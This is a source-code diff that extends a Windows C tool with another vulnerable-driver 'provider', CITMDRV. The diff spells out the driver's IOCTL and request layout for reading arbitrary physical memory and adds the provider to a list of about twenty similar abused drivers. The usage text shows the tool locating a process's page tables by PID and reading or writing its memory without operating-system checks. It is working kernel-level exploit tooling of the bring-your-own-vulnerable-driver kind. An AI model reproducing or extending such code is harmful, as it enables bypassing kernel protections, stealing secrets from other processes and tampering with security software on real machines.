@@ -669,6 +669,35 @@ static int write_amifldrv(mb_phys_reader *r, uint64_t pa, const void *buf, uint3
     return 1;
 }
 
+// ---- 取数层 provider: CITMDRV physical memory map ----
+// Device \\.\CITMDRV. IOCTL 0x80002000 (IOCTL_MAP_MEM): input 0x18
+//   {u64 phys; u64 user_buffer_va; u32 size; u32 reserved}
+// Driver maps \Device\PhysicalMemory and copies size bytes to the supplied
+// user buffer VA. We pass a temporary user buffer and copy it out.
+static int citmdrv_build_request(uint64_t pa, void *dst, uint32_t size, uint8_t out[0x18]) {
+    if (!out || !dst || !size) return 0;
+    memset(out, 0, 0x18);
+    *(uint64_t *)(out + 0x00) = pa;
+    *(uint64_t *)(out + 0x08) = (uint64_t)(uintptr_t)dst;
+    *(uint32_t *)(out + 0x10) = size;
+    *(uint32_t *)(out + 0x14) = 0;
+    return 1;
+}
+
+static int read_citmdrv(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    uint8_t *tmp = (uint8_t *)malloc(size);
+    if (!tmp) return 0;
+    uint8_t req[0x18], resp[8];
+    DWORD ret = 0;
+    if (!citmdrv_build_request(pa, tmp, size, req)) { free(tmp); return 0; }
+    memset(resp, 0, sizeof(resp));
+    BOOL ok = DeviceIoControl(r->dev, 0x80002000u, req, sizeof(req), resp, sizeof(resp), &ret, NULL);
+    if (ok) memcpy(buf, tmp, size);
+    free(tmp);
+    return ok ? 1 : 0;
+}
+
 static int read_winio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
     uint8_t req[0x28];
     DWORD ret = 0;
@@ -914,8 +943,17 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
                              NULL, OPEN_EXISTING, 0, NULL);
         if (r->dev == INVALID_HANDLE_VALUE)
             fprintf(stderr, "[HINT] AMI flash driver device not found (need amifldrv64.sys loaded)\n");
+    } else if (_stricmp(kind, "citmdrv") == 0) {
+        r->name = "citmdrv";
+        r->mode = 19;
+        r->read = read_citmdrv;
+        r->dev = CreateFileA(device ? device : "\\\\.\\CITMDRV",
+                             GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                             NULL, OPEN_EXISTING, 0, NULL);
+        if (r->dev == INVALID_HANDLE_VALUE)
+            fprintf(stderr, "[HINT] CITMDRV device not found (need CITMDRV_AMD64.sys loaded)\n");
     } else {
-        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit|asmmap|atillk64|asio64|adv64drv|ntiolib|winring0|amifldrv)\n", kind ? kind : "");
+        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit|asmmap|atillk64|asio64|adv64drv|ntiolib|winring0|amifldrv|citmdrv)\n", kind ? kind : "");
         return 0;
     }
     if (r->dev == INVALID_HANDLE_VALUE) {
@@ -1460,7 +1498,7 @@ static int hex_decode(const char *s, uint8_t *out, int max) {
 // Diagnostic: probe which real provider devices are currently present.
 static int probe_readers(void) {
     const char *kinds[] = { "cchwapi", "rtkio", "eneio64", "asrdrv", "mrt", "cpuz",
-                            "asupio64", "asio2", "aswarpot", "winio64", "dumpit", "asmmap", "atillk64", "asio64", "adv64drv", "ntiolib", "winring0", "amifldrv" };
+                            "asupio64", "asio2", "aswarpot", "winio64", "dumpit", "asmmap", "atillk64", "asio64", "adv64drv", "ntiolib", "winring0", "amifldrv", "citmdrv" };
     int present = 0;
     for (size_t i = 0; i < sizeof(kinds) / sizeof(kinds[0]); i++) {
         mb_phys_reader r;
@@ -1733,6 +1771,15 @@ static int selftest_mock(void) {
                   *(uint32_t *)(amiw + 0x0c) == 0xAB;
     check("取数层(fetcher)", "amifldrv write request layout (PA/value)", ok_amiw);
 
+    // CITMDRV map request layout (offline, no driver)
+    uint8_t citreq[0x18];
+    char citbuf[4];
+    int ok_cit = citmdrv_build_request(0x12345678, citbuf, 4, citreq) &&
+                 *(uint64_t *)(citreq + 0x00) == 0x12345678ull &&
+                 *(uint64_t *)(citreq + 0x08) == (uint64_t)(uintptr_t)citbuf &&
+                 *(uint32_t *)(citreq + 0x10) == 4;
+    check("取数层(fetcher)", "citmdrv map request layout (PA/dst/size)", ok_cit);
+
     // 定位层 alone (physical EPROCESS scan, no kernel reader)
     uint64_t located_cr3 = 0, eproc = 0;
     int ok_loc = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe",
@@ -1864,12 +1911,12 @@ static void usage(void) {
     printf("  layers --probe-locators (try opening KKYUM / Invary / KPRL locator devices)\n");
     printf("  layers --selftest-mock\n");
     printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit|asmmap|atillk64|asio64|adv64drv|ntiolib|winring0|amifldrv> [--device <path>] --read-phys --pa <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit|asmmap|atillk64|asio64|adv64drv|ntiolib|winring0|amifldrv|citmdrv> [--device <path>] --read-phys --pa <hex> --size <n>\n");
     printf("  layers --reader ... --write-phys --pa <hex> --data <hex bytes>  (providers with write)\n");
     printf("  layers --reader <mock> --cr3 <hex> --va <hex> --size <n>\n");
     printf("  layers --reader ... --cr3 <hex> --va <hex> --size <n> [--la57]  (translate/read, 4-level or 5-level)\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit|asmmap|atillk64|asio64|adv64drv|ntiolib|winring0|amifldrv> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit|asmmap|atillk64|asio64|adv64drv|ntiolib|winring0|amifldrv> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit|asmmap|atillk64|asio64|adv64drv|ntiolib|winring0|amifldrv|citmdrv> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot|winio64|dumpit|asmmap|atillk64|asio64|adv64drv|ntiolib|winring0|amifldrv|citmdrv> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
     printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
